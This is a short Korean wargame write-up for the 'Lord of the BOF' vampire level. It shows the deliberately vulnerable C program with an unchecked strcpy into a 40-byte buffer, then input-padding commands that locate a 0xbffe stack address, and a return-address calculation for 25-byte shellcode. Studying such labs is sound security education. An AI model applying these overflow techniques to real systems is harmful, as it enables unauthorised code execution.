## troll
<hr style="border-top: 1px solid;"><br>

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");

        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

## Solution
<hr style="border-top: 1px solid;"><br>

1번 문제처럼 풀면 됨. 

여기서 주소값이 문젠데 버퍼에 계속 값을 주다보면 ```0xbffe```로 시작하는 버퍼 주소를 찾을 수 있음. 

<br>

```shell
[troll@localhost troll]$ ./vamp1re `python -c 'print "A"*44+"BBB\xbf"+"C"*10000'`
buffer : 0xbfffd3c0
Segmentation fault (core dumped)
[troll@localhost troll]$ ./vamp1re `python -c 'print "A"*44+"BBB\xbf"+"C"*100000'`
buffer : 0xbffe7430
Segmentation fault (core dumped)
```

<br>

25byte 쉘코드를 사용할 것이기 때문에 ```0xbffe7430+25=0xbffe7455```
